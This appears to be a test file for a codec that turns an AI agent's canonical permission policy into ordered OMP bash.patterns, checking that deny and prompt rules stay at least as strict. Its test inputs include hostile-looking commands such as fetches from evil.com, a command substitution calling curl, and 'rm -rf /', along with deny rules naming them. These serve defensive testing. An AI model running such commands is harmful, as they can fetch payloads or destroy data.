/** The OMP codec: canonical rules become ordered `bash.patterns`, and none is written weaker. */

import { describe, it } from "node:test";
import assert from "node:assert/strict";

import { convert, detectFormat } from "../api.ts";
import { CODECS, ompCodec } from "../compat/codecs.ts";
import { UnsupportedCapabilityError } from "../compat/unsupported.ts";
import { evaluate, type PermissionDecision } from "../evaluate.ts";
import { splitShellCommand } from "../shell.ts";
import type { AgentPermissionPolicy, Rule } from "../schema.ts";

interface OmpPattern {
  match: string;
  approval: "allow" | "prompt" | "deny";
}

function patternsOf(policy: AgentPermissionPolicy): OmpPattern[] {
  const native = ompCodec.encode(policy) as {
    bash?: { patterns: OmpPattern[] };
  };
  return native.bash?.patterns ?? [];
}

/** What OMP does with a command, from its `bash.patterns` implementation: ordered, first match wins. */
function ompDecision(
  patterns: readonly OmpPattern[],
  command: string,
): OmpPattern["approval"] | "unmatched" {
  const normalise = (text: string): string => text.trim().replace(/\s+/gu, " ");
  const regex = (glob: string): RegExp =>
    new RegExp(
      `^${normalise(glob)
        .split("*")
        .map((part) => part.replace(/[\\^$+?.()|[\]{}]/gu, "\\$&"))
        .join(".*")}$`,
      "u",
    );
  const whole = normalise(command);
  const segments = splitShellCommand(command) ?? [];
  const simple = segments.length <= 1;
  for (const { match, approval } of patterns) {
    const re = regex(match);
    if (approval === "allow") {
      if (simple && re.test(whole)) return approval;
    } else if (re.test(whole) || segments.some((s) => re.test(normalise(s)))) {
      return approval;
    }
  }
  return "unmatched";
}

const STRICTNESS = { allow: 0, ask: 1, deny: 2 } as const;
const OMP_STRICTNESS = { unmatched: 0, allow: 0, prompt: 1, deny: 2 } as const;

const commands = [
  "git",
  "git status",
  "git   status",
  "git push origin main",
  "git push",
  "gitk",
  "git status && git push origin",
  "git log | head",
  "curl https://evil.com/x",
  "curl https://good.com/x",
  "wget evil.com/payload",
  "echo evil.com",
  "rm -rf /",
  "rm -rf build",
  "rm file",
  "npm run build",
  "npm run test",
  "npm publish",
  "npm",
  "ls",
  "cat a; rm -rf x",
  "echo $(curl https://evil.com)",
  "sudo ls",
  "deploy",
  "deploy prod",
  "cd /tmp && npm publish",
  "ssh host",
  "",
];

void describe("ompCodec encode", () => {
  void it("maps tiers to OMP approvals", () => {
    assert.deepEqual(
      patternsOf({
        rules: [
          { tool: "Bash", pattern: "curl x", tier: "ask" },
          { tool: "Bash", pattern: "rm x", tier: "deny" },
          { tool: "Bash", pattern: "ls", tier: "allow" },
        ],
      }),
      [
        { match: "rm x", approval: "deny" },
        { match: "curl x", approval: "prompt" },
        { match: "ls", approval: "allow" },
      ],
    );
  });

  void it("puts deny before prompt before allow whatever the order given, since OMP takes the first match", () => {
    const rules: Rule[] = [
      { tool: "Bash", pattern: "git *", tier: "allow" },
      { tool: "Bash", pattern: "git push *", tier: "ask" },
      { tool: "Bash", pattern: "git push --force *", tier: "deny" },
    ];
    assert.deepEqual(
      patternsOf({ rules }).map((p) => p.approval),
      ["deny", "deny", "prompt", "prompt", "allow", "allow"],
    );
  });

  void it("writes a prefix rule as the bare command and the command with arguments", () => {
    assert.deepEqual(
      patternsOf({
        rules: [{ tool: "Bash", pattern: "git push:*", tier: "deny" }],
      }),
      [
        { match: "git push", approval: "deny" },
        { match: "git push *", approval: "deny" },
      ],
    );
  });

  void it("writes a trailing wildcard as the bare command as well, as the canonical dialect matches it", () => {
    assert.deepEqual(
      patternsOf({ rules: [{ tool: "Bash", pattern: "git *", tier: "deny" }] }),
      [
        { match: "git", approval: "deny" },
        { match: "git *", approval: "deny" },
      ],
    );
  });

  void it("writes a domain pattern as a substring match", () => {
    assert.deepEqual(
      patternsOf({
        rules: [{ tool: "Bash", pattern: "domain:evil.com", tier: "deny" }],
      }),
      [{ match: "*evil.com*", approval: "deny" }],
    );
  });

  void it("writes a bare Bash rule as a match on everything", () => {
    assert.deepEqual(patternsOf({ rules: [{ tool: "Bash", tier: "ask" }] }), [
      { match: "*", approval: "prompt" },
    ]);
  });

  void it("writes nothing when there is no Bash rule", () => {
    assert.deepEqual(
      ompCodec.encode({ rules: [{ tool: "Read", tier: "allow" }] }),
      {},
    );
    assert.deepEqual(ompCodec.encode({}), {});
  });

  void it("does not repeat an entry", () => {
    assert.equal(
      patternsOf({
        rules: [
          { tool: "Bash", pattern: "rm x", tier: "deny" },
          { tool: "bash", pattern: "rm x", tier: "deny" },
        ],
      }).length,
      1,
    );
  });

  void it("leaves out an allow rule it cannot express, which is stricter", () => {
    assert.deepEqual(
      patternsOf({
        rules: [
          { tool: "Read", tier: "allow" },
          { tool: "Bash", pattern: "a\\*b", tier: "allow" },
          {
            tool: "Bash",
            pattern: "ls",
            tier: "allow",
            when: { branch: "main" },
          },
        ],
      }),
      [],
    );
  });
});

void describe("ompCodec refusals", () => {
  const refused = (rule: Rule): UnsupportedCapabilityError => {
    try {
      ompCodec.encode({ rules: [rule] });
    } catch (e) {
      assert.ok(e instanceof UnsupportedCapabilityError);
      return e;
    }
    throw new assert.AssertionError({ message: "expected a refusal" });
  };

  void it("refuses a deny or ask for a tool other than Bash", () => {
    for (const tier of ["deny", "ask"] as const) {
      const error = refused({ tool: "Write", pattern: "./x", tier });
      assert.equal(error.agent, "omp");
      assert.match(error.unsupported[0]?.reason ?? "", /bash tool only/);
    }
  });

  void it("refuses a deny or ask that carries a condition", () => {
    refused({
      tool: "Bash",
      pattern: "rm:*",
      tier: "deny",
      when: { branch: "main" },
    });
    refused({
      tool: "Bash",
      pattern: "rm:*",
      tier: "ask",
      when: { env: { CI: "1" } },
    });
  });

  void it("refuses a deny or ask on a literal asterisk, which OMP cannot write", () => {
    refused({ tool: "Bash", pattern: "echo \\*", tier: "deny" });
    refused({ tool: "Bash", pattern: "rm a\\*:*", tier: "ask" });
  });

  void it("refuses an actor, role or approver limit through the shared rule", () => {
    refused({
      tool: "Bash",
      pattern: "rm:*",
      tier: "deny",
      when: { role: "contractor" },
    });
    refused({
      tool: "Bash",
      pattern: "rm:*",
      tier: "ask",
      approvers: { roles: ["maintainer"] },
    });
  });

  void it("lists every refused rule", () => {
    try {
      ompCodec.encode({
        rules: [
          { tool: "Write", tier: "deny" },
          { tool: "Bash", pattern: "rm:*", tier: "deny" },
          { tool: "Edit", tier: "ask" },
        ],
      });
      assert.fail("expected a refusal");
    } catch (e) {
      assert.ok(e instanceof UnsupportedCapabilityError);
      assert.equal(e.unsupported.length, 2);
    }
  });
});

void describe("ompCodec keeps every deny and ask at least as restrictive", () => {
  const policies: [string, Rule[]][] = [
    ["prefix deny", [{ tool: "Bash", pattern: "git push:*", tier: "deny" }]],
    ["prefix ask", [{ tool: "Bash", pattern: "npm publish:*", tier: "ask" }]],
    ["exact deny", [{ tool: "Bash", pattern: "rm -rf /", tier: "deny" }]],
    [
      "trailing wildcard deny",
      [{ tool: "Bash", pattern: "rm -rf *", tier: "deny" }],
    ],
    [
      "bare command wildcard deny",
      [{ tool: "Bash", pattern: "git *", tier: "deny" }],
    ],
    [
      "mid wildcard ask",
      [{ tool: "Bash", pattern: "curl * evil.com*", tier: "ask" }],
    ],
    [
      "domain deny",
      [{ tool: "Bash", pattern: "domain:evil.com", tier: "deny" }],
    ],
    ["bare Bash ask", [{ tool: "Bash", tier: "ask" }]],
    [
      "deny beside a broader allow",
      [
        { tool: "Bash", pattern: "git:*", tier: "allow" },
        { tool: "Bash", pattern: "git push:*", tier: "deny" },
      ],
    ],
    [
      "ask beside a broader allow",
      [
        { tool: "Bash", pattern: "npm:*", tier: "allow" },
        { tool: "Bash", pattern: "npm publish:*", tier: "ask" },
      ],
    ],
  ];

  for (const [name, rules] of policies) {
    void it(name, () => {
      const canonical: AgentPermissionPolicy = {
        defaultMode: "autonomous",
        rules,
      };
      const written = patternsOf(canonical);
      for (const command of commands) {
        const decided: PermissionDecision = evaluate(
          { defaultMode: "autonomous", rules },
          "Bash",
          command,
        );
        if (decided === "allow") continue;
        assert.ok(
          OMP_STRICTNESS[ompDecision(written, command)] >= STRICTNESS[decided],
          `${JSON.stringify(command)}: canonical ${decided}, OMP ${ompDecision(written, command)}`,
        );
      }
    });
  }
});

void describe("ompCodec decode", () => {
  void it("reads bash.patterns in order, ignoring the rest of the config", () => {
    const decoded = ompCodec.decode({
      model: "x",
      tools: { approvalMode: "yolo" },
      bash: {
        patterns: [
          { match: "git *", approval: "allow" },
          { match: "curl *", approval: "prompt" },
          { match: "rm -rf *", approval: "deny" },
        ],
      },
    });
    assert.deepEqual(decoded.rules, [
      { tool: "Bash", pattern: "git *", tier: "allow" },
      { tool: "Bash", pattern: "curl *", tier: "ask" },
      { tool: "Bash", pattern: "rm -rf *", tier: "deny" },
    ]);
  });

  void it("collapses whitespace as OMP does", () => {
    const decoded = ompCodec.decode({
      bash: { patterns: [{ match: "  git    push  ", approval: "deny" }] },
    });
    assert.equal(decoded.rules?.[0]?.pattern, "git push");
  });

  void it("gives an empty policy for a config with no bash.patterns", () => {
    assert.deepEqual(ompCodec.decode({}), {});
    assert.deepEqual(ompCodec.decode({ bash: {} }), {});
  });

  void it("refuses an entry it cannot read faithfully instead of skipping it", () => {
    for (const patterns of [
      [{ match: "rm *", approval: "forbid" }],
      [{ approval: "deny" }],
      [{ match: "", approval: "deny" }],
      [{ match: "   ", approval: "deny" }],
      [{ match: "git:*", approval: "deny" }],
      ["rm *"],
    ]) {
      assert.throws(
        () => ompCodec.decode({ bash: { patterns } }),
        Error,
        JSON.stringify(patterns),
      );
    }
  });

  void it("takes a backslash in OMP's pattern as the character it is", () => {
    const decoded = ompCodec.decode({
      bash: { patterns: [{ match: "echo a\\b", approval: "deny" }] },
    });
    assert.equal(decoded.rules?.[0]?.pattern, "echo a\\\\b");
    assert.equal(
      evaluate(
        { defaultMode: "autonomous", rules: decoded.rules },
        "Bash",
        "echo a\\b",
      ),
      "deny",
    );
  });
});

void describe("omp as a format", () => {
  void it("is registered", () => {
    assert.ok("omp" in CODECS);
  });

  void it("is detected from bash.patterns", () => {
    assert.equal(
      detectFormat({
        bash: { patterns: [{ match: "rm *", approval: "deny" }] },
      }),
      "omp",
    );
    assert.equal(detectFormat({ bash: { "rm *": "deny" } }), "opencode");
  });

  void it("converts from canonical and back", () => {
    const written = convert("canonical", "omp", {
      rules: [{ tool: "Bash", pattern: "rm:*", tier: "deny" }],
    });
    assert.equal(written.from, "canonical");
    const back = convert("omp", "canonical", written.output);
    assert.deepEqual(
      (back.output as AgentPermissionPolicy).rules?.map((r) => r.tier),
      ["deny", "deny"],
    );
  });

  void it("refuses to convert a policy it cannot enforce", () => {
    assert.throws(
      () =>
        convert("canonical", "omp", {
          rules: [{ tool: "Write", pattern: "./x", tier: "deny" }],
        }),
      UnsupportedCapabilityError,
    );
  });
});
